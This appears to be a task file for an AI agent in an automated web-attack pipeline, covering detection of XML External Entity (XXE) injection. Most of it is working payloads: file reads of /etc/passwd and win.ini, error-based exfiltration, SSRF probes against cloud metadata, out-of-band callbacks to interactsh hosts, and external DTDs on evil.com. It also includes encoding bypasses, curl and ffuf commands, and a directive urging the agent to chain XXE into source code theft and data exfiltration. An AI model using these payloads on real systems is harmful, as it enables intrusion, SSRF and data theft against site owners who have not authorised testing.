================================================================================
TASK 52 â€” XXE DETECTION SCANNER
================================================================================
Covers testing_toolkit.txt Phase 5 Step 16 (Detection)
Exploitation â†’ Task 53

OBJECTIVE
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Identify XML External Entity (XXE) injection points by:
- Finding endpoints that accept XML input
- Testing basic XXE payloads (direct vs blind)
- Identifying XML parsers and their configurations
- Detecting OOB-only (blind) XXE candidates

================================================================================
                              INPUT FILES
================================================================================
PRIMARY (endpoints to test):
  outputs/queue_dynamic_endpoints_urls.txt    â† parameterized URLs
  outputs/api_endpoints_live.txt              â† API endpoints
  outputs/har/common_data.txt                 â† HAR-extracted requests

SECONDARY (file upload points):
  outputs/upload_endpoints.txt                â† file upload forms
  outputs/api_docs_urls.txt                   â† API docs (SOAP/WSDL?)

INTELLIGENCE:
  outputs/waf_summary.json                    â† WAF detection
  outputs/nuclei/tech_stack.json              â† tech stack

================================================================================
                             OUTPUT FILES
================================================================================
outputs/xxe/
â”œâ”€â”€ xxe_vulnerable.json           â† confirmed XXE (direct response)
â”œâ”€â”€ xxe_blind_candidates.json     â† suspected blind XXE â†’ Task 53
â”œâ”€â”€ xml_endpoints.txt             â† endpoints accepting XML
â”œâ”€â”€ soap_endpoints.txt            â† SOAP/WSDL services found
â”œâ”€â”€ upload_xxe_candidates.txt     â† file uploads to test with XXE
â”œâ”€â”€ task53_targets.json           â† blind XXE targets for exploitation
â”œâ”€â”€ scan_log.txt                  â† execution log
â””â”€â”€ checkpoint.json               â† resume state

================================================================================
                    XML ENDPOINT DISCOVERY
================================================================================

CONTENT-TYPE INDICATORS (endpoints likely accepting XML):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
application/xml
text/xml
application/soap+xml
application/xhtml+xml
application/rss+xml
application/atom+xml
image/svg+xml
application/saml+xml
application/xslt+xml

URL PATH INDICATORS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
/soap, /wsdl, /xml, /rss, /feed, /atom
/api/v1/xml, /service, /ws/
/saml/, /sso/, /metadata
/.well-known/

FILE UPLOAD TYPES TO TEST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
.xml          â† Direct XML upload
.svg          â† SVG images (XML-based)
.docx/.xlsx   â† Office docs (contain XML)
.xls          â† Excel (older format, still XML)
.pptx         â† PowerPoint (contains XML)
.odt/.ods     â† OpenDocument (XML-based)

================================================================================
                         XXE DETECTION PAYLOADS
================================================================================

SECTION 1: BASIC XXE TEST (Direct Response)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if XML parsing is enabled and external entities work

# Linux file read
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# Windows file read
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

# Alternative: /etc/hostname (smaller, less intrusive)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>

SECTION 2: XXE WITH PARAMETER ENTITIES
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If regular entities blocked, try parameter entities

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>

SECTION 3: XXE VIA SSRF (Internal Network)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Probe internal services via XXE

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>

# Cloud metadata
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

SECTION 4: BLIND XXE DETECTION (OOB)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# When no response visible, use OOB callback

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH.oast.fun/xxe-test">
]>
<root>&xxe;</root>

# With DNS exfiltration
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.YOUR_INTERACTSH.oast.fun">
]>
<root>&xxe;</root>

SECTION 5: ERROR-BASED XXE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Force error that leaks file contents

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>

SECTION 6: SVG XXE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# For SVG file uploads

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>

# SVG with OOB callback
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH.oast.fun/svg-xxe">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>

SECTION 7: SOAP XXE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# For SOAP/WSDL services

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>

================================================================================
                         BYPASS TECHNIQUES
================================================================================

ENCODING BYPASSES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# UTF-16 encoding
<?xml version="1.0" encoding="UTF-16"?>

# UTF-7 encoding
<?xml version="1.0" encoding="UTF-7"?>

# With BOM
(add BOM bytes before XML declaration)

ENTITY ENCODING TRICKS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Hex encoding in entity
<!ENTITY xxe SYSTEM "file:///etc/p&#x61;sswd">

# Decimal encoding
<!ENTITY xxe SYSTEM "file:///etc/p&#97;sswd">

PROTOCOL VARIATIONS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
file:///etc/passwd
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
jar:file:///tmp/test.jar!/test.txt
netdoc:///etc/passwd
expect://id

PARSER-SPECIFIC BYPASSES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Some parsers need specific DOCTYPE formats
<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">
<!DOCTYPE foo PUBLIC "-//evil//DTD//EN" "http://evil.com/xxe.dtd">

================================================================================
                         TOOL COMMANDS
================================================================================

NUCLEI XXE TEMPLATES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Run all XXE templates
nuclei -l xml_endpoints.txt -t nuclei-templates/http/vulnerabilities/xxe/ -o nuclei_xxe_results.txt

# Specific XXE checks
nuclei -l targets.txt -tags xxe -o xxe_scan.txt

CURL MANUAL TESTING:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Basic XXE test
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# With authentication
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer TOKEN" \
  -d @xxe_payload.xml

# SOAP request
curl -X POST "https://target.com/soap/service" \
  -H "Content-Type: application/soap+xml" \
  -H "SOAPAction: test" \
  -d @soap_xxe.xml

FFUF FOR XML ENDPOINT DISCOVERY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Find XML endpoints
ffuf -u "https://target.com/FUZZ" \
  -w wordlist.txt \
  -mc 200 \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>1</test>' \
  -o xml_endpoints.json

================================================================================
                         DETECTION WORKFLOW
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Identify XML Endpoints                                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Analyze HAR files for Content-Type: application/xml                       â”‚
â”‚ â€¢ Scan API docs for SOAP/WSDL references                                    â”‚
â”‚ â€¢ Check for file upload accepting XML/SVG/Office docs                       â”‚
â”‚ â€¢ Run Nuclei with xxe tags for quick wins                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 2: Test Basic XXE (Direct Response)                                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Send file:///etc/passwd payload                                           â”‚
â”‚ â€¢ Check response for file contents                                          â”‚
â”‚ â€¢ If content appears â†’ CONFIRMED XXE                                        â”‚
â”‚ â€¢ If error with filename â†’ Parser processes entities (test more)            â”‚
â”‚ â€¢ If reflected as-is â†’ No XXE, parser escapes entities                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 3: Test OOB XXE (Blind Detection)                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Start Interactsh listener (or reuse from SSRF)                            â”‚
â”‚ â€¢ Send OOB payload with unique identifier                                   â”‚
â”‚ â€¢ Wait for callback (DNS or HTTP)                                           â”‚
â”‚ â€¢ Callback received â†’ BLIND XXE CONFIRMED â†’ Task 53                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 4: Test SSRF via XXE                                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Try internal URLs: http://127.0.0.1, http://localhost                     â”‚
â”‚ â€¢ Try cloud metadata: http://169.254.169.254/                               â”‚
â”‚ â€¢ Different response = internal access possible                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 5: Output & Feed Task 53                                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Write xxe_vulnerable.json (direct XXE)                                    â”‚
â”‚ â€¢ Write task53_targets.json (blind XXE for exploitation)                    â”‚
â”‚ â€¢ Write xml_endpoints.txt (all discovered XML endpoints)                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
                     AI AGENT CREATIVITY DIRECTIVE
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ XXE is about finding XML PARSERS. Think about WHERE XML is processed.       â”‚
â”‚                                                                             â”‚
â”‚ DISCOVER XML PROCESSING POINTS:                                             â”‚
â”‚                                                                             â”‚
â”‚ 1. OBVIOUS: API endpoints with Content-Type: application/xml                â”‚
â”‚ 2. HIDDEN: Endpoints that ACCEPT XML even if not advertised                 â”‚
â”‚    - Try sending XML to JSON endpoints (some parsers auto-detect)           â”‚
â”‚    - Change Content-Type header and observe behavior                        â”‚
â”‚                                                                             â”‚
â”‚ 3. FILE UPLOADS: Any upload that processes the file server-side             â”‚
â”‚    - Image uploads (SVG is XML!)                                            â”‚
â”‚    - Document uploads (DOCX/XLSX contain XML inside)                        â”‚
â”‚    - Import features (often parse XML/CSV)                                  â”‚
â”‚                                                                             â”‚
â”‚ 4. SOAP/WSDL: Legacy services often vulnerable                              â”‚
â”‚    - Look for /soap, /ws/, /service endpoints                               â”‚
â”‚    - Check WSDL files for service definitions                               â”‚
â”‚                                                                             â”‚
â”‚ OBSERVE AND ADAPT:                                                          â”‚
â”‚                                                                             â”‚
â”‚ â€¢ Response shows file content? â†’ Direct XXE, extract more files             â”‚
â”‚ â€¢ Error shows file path? â†’ Parser tries to read, may leak via error         â”‚
â”‚ â€¢ No visible output? â†’ Try OOB with Interactsh                              â”‚
â”‚ â€¢ OOB callback received? â†’ Blind XXE confirmed, use external DTD            â”‚
â”‚                                                                             â”‚
â”‚ THINK ABOUT THE PARSER:                                                     â”‚
â”‚                                                                             â”‚
â”‚ â€¢ Java (DocumentBuilder) â†’ Often vulnerable by default                      â”‚
â”‚ â€¢ PHP (SimpleXML, DOMDocument) â†’ Check libxml version                       â”‚
â”‚ â€¢ Python (lxml, xml.etree) â†’ Depends on configuration                       â”‚
â”‚ â€¢ .NET (XmlReader) â†’ Usually secure by default, but check                   â”‚
â”‚                                                                             â”‚
â”‚ Error messages often REVEAL the parser - read them carefully!               â”‚
â”‚                                                                             â”‚
â”‚ CHAIN FINDINGS:                                                             â”‚
â”‚ â€¢ XXE â†’ File read â†’ Source code â†’ More vulnerabilities                      â”‚
â”‚ â€¢ XXE â†’ SSRF â†’ Internal services â†’ Cloud metadata                           â”‚
â”‚ â€¢ XXE â†’ Error-based â†’ Data exfiltration via error messages                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CONTENT-TYPE MANIPULATION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Try these Content-Type headers on endpoints that DON'T advertise XML:

Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/xml; charset=utf-8
Content-Type: text/xml; charset=utf-8

If endpoint normally takes JSON:
- Keep JSON structure but wrap in XML
- Or just send raw XML and see if parser accepts

================================================================================
                              CHECKPOINT/RESUME
================================================================================
checkpoint.json format:
{
  "last_target_index": 50,
  "xml_endpoints_found": 12,
  "xxe_confirmed": 2,
  "blind_candidates": 5,
  "interactsh_subdomain": "abc123.oast.fun",
  "timestamp": "2026-01-13T10:30:00Z"
}

================================================================================
                             9-MINUTE BATCHING
================================================================================
- Process 50 endpoints per batch (XXE testing is relatively fast)
- Check Interactsh for OOB callbacks after each batch
- Write outputs after each batch
- Checkpoint every batch
- Total timeout: 8 minutes active + 1 minute output

================================================================================
                                  NOTES
================================================================================
- Start Interactsh FIRST (reuse from SSRF/Task 50 if running)
- Direct XXE is rare now - most findings are BLIND
- Blind XXE requires external DTD server â†’ Task 53
- SVG uploads are often overlooked but frequently vulnerable
- Office document XXE (DOCX/XLSX) requires file crafting â†’ Task 53
- Error messages are GOLD - they reveal parser and configuration
================================================================================
